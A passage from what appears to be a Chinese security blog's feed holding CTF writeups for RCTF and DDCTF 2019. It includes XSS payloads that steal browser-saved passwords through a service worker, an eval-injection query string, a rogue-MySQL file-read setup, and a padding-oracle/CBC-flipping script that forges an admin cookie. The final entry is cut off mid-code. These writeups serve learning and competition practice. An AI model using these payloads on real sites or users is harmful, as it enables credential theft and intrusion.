class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这时我们在post的地方增加两个input，一个是username，一个是password，控制脚本去点击这个username的input，然后再去读取<code>document.body.innerHTML</code>。发现会多出一些条目，在其中可以看到flag的选项。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123; <span class="built_in">document</span>.querySelector(<span class="string">'[type=username]'</span>).click() &#125;,<span class="number">500</span>); setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;navigator.serviceWorker.register(<span class="string">'/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.body.innerHTML), &#123;<span class="attr">scope</span>:<span class="string">'/uploads/'</span>&#125;);&#125;, <span class="number">1000</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>很明显了，只要选择flag为用户名，再去读取密码就可以了。最后读取flag的password的脚本，配合上之前jail同样的service worker的js，就能收到flag了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">document</span>.querySelector(<span class="string">'[type=username]'</span>).click()&#125;,<span class="number">500</span>);</span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">document</span>.getElementById(<span class="string">'cip-ui-id-4'</span>).click()&#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;navigator.serviceWorker.register(<span class="string">'/uploads/511b3c8839bd36230c4aa3c5ff5545ef.js?'</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.getElementById(<span class="string">'password'</span>).value), &#123;<span class="attr">scope</span>:<span class="string">'/uploads/'</span>&#125;);&#125;, <span class="number">1500</span>)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过这道题我们也知道浏览器保管密码也是会被偷取的，这里拓展一下，是能够写个脚本遍历所有的用户名和密码然后依次发送回xss平台的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一年一度的RCTF开始了，又能学一波骚操作，RCTF的web题目去年就非常好，今年也特别出色。由于研究所月赛的原因没有参与其中，所以赛后来复现一下。&lt;/p&gt;
&lt;h2 id=&quot;nextphp&quot;&gt;&lt;a href=&quot;#nextphp&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019DDCTF 未解决的web题 writeup</title>
    <link href="https://hurricane618.me/2019/04/29/2019ddctf-unsolved-writeup/"/>
    <id>https://hurricane618.me/2019/04/29/2019ddctf-unsolved-writeup/</id>
    <published>2019-04-29T06:52:54.000Z</published>
    <updated>2019-04-29T06:57:07.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>一道python的代码审计题目，题目的入口点会检测url中携带的参数并且初始化session的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">  querystring = urllib.unquote(request.query_string)</span><br><span class="line">  request.event_queue = []</span><br><span class="line">  <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">    querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">  <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">    session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">    session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">    session[<span class="string">'log'</span>] = []</span><br><span class="line">  request.prev_session = dict(session)</span><br><span class="line">  trigger_event(querystring)</span><br><span class="line">  <span class="keyword">return</span> execute_event_loop()</span><br></pre></td></tr></table></figure><p>这里看到对查询参数有转义，同时有一定的限制，比如开头必须为<code>action:</code>，同时长度不能超过100。</p><p>在进入处理事件循环之前会先将查询参数添加进事件记录中。这里可以看到会对<code>event</code>做判断，所以它既可以传数列也可以是单个值，这里是这道题目的关键点之一，它的参数是可以传数列的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">  session[<span class="string">'log'</span>].append(event)</span><br><span class="line">  <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">  <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">    request.event_queue += event</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    request.event_queue.append(event)</span><br></pre></td></tr></table></figure><p>这之后就会进入事件处理循环中，最关键的一点是针对事件的处理，从事件队列中取出一个，随后会判断是否为<code>action</code>，将<code>:</code>和<code>;</code>之间的字符串当作函数动作名，并且把剩下的字符串用<code>#</code>切分当作参数。函数动作拼接后缀字符串之后用<code>eval</code>执行成为相应的函数，最后函数带入参数执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">    ...</span><br><span class="line">is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">ret_val = event_handler(args)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>大致的流程就是这样，这里题目的关键点是下面的<code>getflag</code>函数，可以看到当session中的数量大于5的时候会将flag添加进事件记录中，同时事件队列也会添加这个任务。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">  flag = args[<span class="number">0</span>]</span><br><span class="line">  <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">    trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">  trigger_event(<span class="string">'action:view;index'</span>)</span><br></pre></td></tr></table></figure><p>但是起始的点数为3，我们怎么才能获得5个钻石？这就要分析购买钻石的操作流程了，这里的购买操作会先增加钻石数量，然后将消费操作加入事件队列中，这就是说购买和消费是分开的并不是原子操作。那么我们可以购买多个钻石，在消费操作之前执行<code>getflag</code>函数就能把flag存入事件队列中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">  num_items = int(args[<span class="number">0</span>])</span><br><span class="line">  <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">  session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">  trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">  point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">  <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">  session[<span class="string">'points'</span>] -= point_to_consume</span><br></pre></td></tr></table></figure><p>好了，我当时就卡在这里，不知道该怎么走下去。因为这里如果按照常规操作只能一次执行一个函数，并不能一次性多次购买，这是第一个问题；第二，就算多次购买之后执行<code>getflag</code>我们也仅仅是把flag放进了事件队列中，而每个事件是独立的没有办法获取前面事件的参数。</p><p>针对第一个问题，如何一次性多次购买，这里就要观察代码中它是如何多次执行的，<code>trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])</code>，使用了<code>trigger_event</code>传入数列，其中数列就是多个操作的集合，所以这里我们也看看能不能调用<code>trigger_event</code>。这里用到了一个作者设计上的问题，如果<code>action</code>中包含<code>#</code>，恰好这个符号是python中的注释符号，那么这个语句中<code>eval(action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))</code>那个<code>#</code>就可以截断后面的后缀，这里的action就是任意代码执行。</p><p>我们的payload：<code>action:trigger_event%23;action:xxx;arg1%23action:xxx;arg2%23</code>，这样后面的参数部分跟着想要调用的函数就可以被<code>trigger_event</code>加进事件队列中，这样我们就可以一次性多次购买了，同时调用<code>getflag</code>就能添加flag进事件队列中。payload：<code>action:trigger_event%23;action:buy;1%23action:buy;1%23action:get_flag;1</code>。</p><p>针对第二个问题，flag已经进入到事件队列中了，怎么查看？这就涉及到flask的session设计了，之前ph牛讲过这类session是和jwt类似的原理。里面的东西是可以被解密的，不能存放用户凭证或者其他一些机密数据。<code>session[&#39;log&#39;].append(event)</code>，这里session会记录事件，所以flag最后也会被记录在里面，那么我们只要调用<code>get_flag</code>之后，我们的session中就会有相关记录，最后只需要解密就可以拿到flag。</p><p>在本地操作可以看到拿到了测试用的flag。</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/1.png"><p>这里需要注意的一点是由于查询字符串会被限制在长度100以内，所以我们需要先正常购买三个钻石，然后再使用上面的方法一次性再购买两个，之后马上调用<code>get_flag</code>。这最后的解密是使用<a href="https://github.com/Paradoxis/Flask-Unsign" target="_blank" rel="noopener">https://github.com/Paradoxis/Flask-Unsign</a></p><p>虽然最后会出现报错，如下图：</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/2.png"><p>但是，flag已经写进了session中，并且没有删除，这就是关键点。</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/3.png"><p>解密数据拿到flag。</p><h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p>从网站页面看来是一个类似<code>hydra</code>的扫描网站，它会去连接我们提供的IP和端口。这里其实比较明显了，在之前比赛遇到的MySQL client读取的漏洞有关，同样是网站担当客户端去请求MySQL服务端。</p><p>如果正常的去扫描的话结果如下：</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/4.png"><p>使用<code>tcpdump</code>抓包的结果是显示没有权限去访问。。。而且由于服务端开启了SSL加密，所以并不能开到所有有用的信息。</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/5.png"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &apos;root&apos;@&apos;117.51.147.155&apos; IDENTIFIED BY &apos;&apos;;</span><br><span class="line">grant all privileges on *.* to &apos;root&apos;@&apos;117.51.147.155&apos; IDENTIFIED BY &apos;&apos; with grant option;</span><br></pre></td></tr></table></figure><p>所以创建一个授权的用户之后，再次抓包来观察数据情况。</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/6.png"><img src="/2019/04/29/2019ddctf-unsolved-writeup/7.png"><p>它会以用户名为root，密码为空的请求来访问我们的MySQL服务端。那么从MySQL官方文档中我们就可以知道，<code>A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL</code>，不仅仅是在读文件操作可以获取本地文件，其他操作依旧可以，但是客户端必须要开启加载本地文件的选项。</p><p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a>从这篇博文中我们获得一个恶意MySQL的脚本，为了让客户端发出查询的操作：</p><ol><li>服务端需要发送<code>Server Greeting</code></li><li>等待客户端回复<code>Query Package</code></li><li>发送<code>file transfer</code>请求</li></ol><p>当然这些格式在官方文档中都有，也可以通过抓包确认。</p><p><a href="https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake" target="_blank" rel="noopener">MySQL握手包</a>，<a href="https://dev.mysql.com/doc/internals/en/com-query-response.html" target="_blank" rel="noopener">文件传输包</a></p><p>然后py脚本开始！点击扫描！然后：</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/8.png"><p>emmmm？？？这是什么鬼？随后仔细看了看题目给的<code>agent.py</code>和抓包中的奇怪http请求，才发现原来这个代理是用来检测服务器上运行的进程的。</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/9.png"><p>那么这样就只能在返回的数据包中手动添加<code>mysqld</code>，来让客户端认为服务端是开启状态。</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/10.png"><p>测试成功，读取到了<code>/etc/passwd</code>的数据。那么接下来就是找flag的过程了。这里是直接读取<code>.bash_history</code>，shell的历史记录来回溯出题人的操作过程，发现最后的<code>/home/dc2-user/ctf_web_2/app/main/views.py</code>。</p><p>在文件中有一条注释<code># flag in mysql  curl@localhost database:security  table:flag</code>，这就知道了flag在数据库中，这里直接读数据库文件就可以了，根据mysql的数据库存储规则<code>/var/lib/mysql/database/table.idb</code>，读取文件<code>/var/lib/mysql/security/flag.idb</code>。</p><p>坑点：在启动伪装mysql的时候，可能一开始扫描会有些问题，有可能是端口释放需要一定的时间。所以如果一次不行，就要多扫几次。</p><p>小技巧：怎么处理这么大一堆字符串，直接复制粘贴，在python中print一下就完事。简单粗暴，不用写脚本，不用手动排版。</p><h2 id="再来一杯Java"><a href="#再来一杯Java" class="headerlink" title="再来一杯Java"></a>再来一杯Java</h2><p>根据题目的要求捆绑hosts，访问链接之后，在cookie中发现token。base64解码之后发现有hint，<code>PadOracle,cbc</code>。</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/11.png"><p>在这之后就是针对cookie做<code>padding oracle</code>和<code>cbc翻转</code>攻击。因为去除首部的描述字符的16位为IV，剩下的是推测的16位字符为一组的密文，那么这样的话就是16位字符串为一个区块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(ciper_hex, N)</span>:</span></span><br><span class="line">    get = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="comment"># print(i,j)</span></span><br><span class="line">            padding = xor(get, chr(i) * (i - <span class="number">1</span>))</span><br><span class="line">            c = chr(<span class="number">0</span>) * (N - i) + chr(j) + padding</span><br><span class="line">            payload=<span class="string">'5061644f7261636c653a69762f636263'</span>+c.encode(<span class="string">'hex'</span>)+ciper_hex</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            get_api_return=get_api(payload)</span><br><span class="line">            <span class="comment"># print(get_api_return)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"decrypt err~"</span> <span class="keyword">not</span> <span class="keyword">in</span> get_api_return:</span><br><span class="line">                get = chr(j ^ i) + get</span><br><span class="line">                print(get.encode(<span class="string">'hex'</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> get.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(strings)</span>:</span></span><br><span class="line">    padding_len=<span class="number">8</span>-len(strings)%<span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> strings+chr(padding_len)*padding_len</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_api</span><span class="params">(ciphertext)</span>:</span></span><br><span class="line">    req_header=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">''</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063'</span>,</span><br><span class="line"><span class="string">'Host'</span>:<span class="string">'c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/home'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>:<span class="string">'token=&#123;&#125;'</span>.format(ciphertext.decode(<span class="string">'hex'</span>).encode(<span class="string">'base64'</span>)[:<span class="number">-1</span>]),</span><br><span class="line">&#125;</span><br><span class="line">    s = requests.session() </span><br><span class="line">    rsp=s.get(<span class="string">'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token'</span>, headers=req_header,timeout=<span class="number">2</span>,verify=<span class="keyword">False</span>,stream=<span class="keyword">True</span>,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">return</span>(rsp.content)  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_byte_flipping</span><span class="params">(strings)</span>:</span></span><br><span class="line">    token_padding=padding(strings)</span><br><span class="line">    c2=<span class="string">'b8d85a91bdeae799086cc723e7bf1685'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">    c2_m=<span class="string">'a7d3878a0466c70b59264b5ed33f5013'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">    c1=xor(c2_m,token_padding[<span class="number">16</span>:])</span><br><span class="line">    c1_m=padding_oracle(c1.encode(<span class="string">'hex'</span>), <span class="number">16</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    iv=xor(c1_m,token_padding[<span class="number">0</span>:<span class="number">16</span>]) <span class="comment">#iv</span></span><br><span class="line">    <span class="keyword">return</span>((iv+c1+c2).encode(<span class="string">'base64'</span>)[:<span class="number">-1</span>])</span><br><span class="line">print(cbc_byte_flipping(<span class="string">'&#123;"id":1,"roleAdmin":true&#125;'</span>))</span><br></pre></td></tr></table></figure><img src="/2019/04/29/2019ddctf-unsolved-writeup/12.png"><p>这里借用chamd5的wp脚本，利用伪造的cookie我们提权成为admin，能下载到一个txt。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Try to hack~ </span><br><span class="line">Hint:</span><br><span class="line">1. Env: Springboot + JDK8(openjdk version &quot;1.8.0_181&quot;) + Docker~ </span><br><span class="line">2. You can not exec commands~</span><br></pre></td></tr></table></figure><p>后面利用这个文件下载的api可以读取文件，在<code>/proc/self/fd/15</code>可以读到jar包，之后就是java的部分了，GG。官方的提示是<code>jrmp</code>，最后看wp是用的Weblogic JRMP反序列化漏洞打出来的。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a></p><p><a href="https://www.zhaoj.in/read-5269.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5269.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485734&amp;idx=1&amp;sn=4d5c92902ece0db4eb29c0addecdb679&amp;chksm=e89e21fedfe9a8e89b42bf1df92ab8907c866df112c4c86bce8a38eafb3d90de9109e6c03516&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1556023454&amp;ascene=7&amp;devicetype=android-28&amp;version=2700033c&amp;nettype=cmnet&amp;abtest_cookie=BAABAAoACwASABMABQAjlx4AX5keAM2ZHgDamR4A3JkeAAAA&amp;lang=zh_CN&amp;pass_ticket=YMjuQzyV9NBheOwb57Q7IzReaZd3gLT38Yu%252B%252FFcSC8KUJPp78f35Uw%252BPwVZ25nDA&amp;wx_header=1" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485734&amp;idx=1&amp;sn=4d5c92902ece0db4eb29c0addecdb679&amp;chksm=e89e21fedfe9a8e89b42bf1df92ab8907c866df112c4c86bce8a38eafb3d90de9109e6c03516&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1556023454&amp;ascene=7&amp;devicetype=android-28&amp;version=2700033c&amp;nettype=cmnet&amp;abtest_cookie=BAABAAoACwASABMABQAjlx4AX5keAM2ZHgDamR4A3JkeAAAA&amp;lang=zh_CN&amp;pass_ticket=YMjuQzyV9NBheOwb57Q7IzReaZd3gLT38Yu%252B%252FFcSC8KUJPp78f35Uw%252BPwVZ25nDA&amp;wx_header=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;homebrew-event-loop&quot;&gt;&lt;a href=&quot;#homebrew-event-loop&quot; class=&quot;headerlink&quot; title=&quot;homebrew event loop&quot;&gt;&lt;/a&gt;homebrew event loop&lt;/h2&gt;&lt;p&gt;一道
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019DDCTF 部分我解决的题目writeup</title>
    <link href="https://hurricane618.me/2019/04/19/2019ddctf-my-solutions-writeup/"/>
    <id>https://hurricane618.me/2019/04/19/2019ddctf-my-solutions-writeup/</id>
    <published>2019-04-19T12:42:51.000Z</published>
    <updated>2019-04-19T13:44:03.905Z</updated>
    
    <content type="html"><![CDATA[<p>我得说DDCTF真的是脑洞太大，一言难尽。。。 </p><h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p>文件包含，需要一些转换。转成hex值之后两次base64。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"><span class="keyword">import</span> binascii </span><br><span class="line"></span><br><span class="line">text = raw_input(<span class="string">'text: '</span>) </span><br><span class="line">text = binascii.b2a_hex(text) </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> text </span><br><span class="line"><span class="keyword">print</span> base64.b64encode(base64.b64encode(text))</span><br></pre></td></tr></table></figure><p>拿到index.php源码 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">\* https://blog.csdn.net/FengBanLiuYun/article/details/80616607 </span></span><br><span class="line"><span class="comment">\* Date: July 4,2018 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE); </span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>); </span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>); </span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>]))); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>; </span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file); </span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>; </span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file); </span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>; </span><br><span class="line">$txt = base64_encode(file_get_contents($file)); </span><br><span class="line"><span class="keyword">echo</span> <span 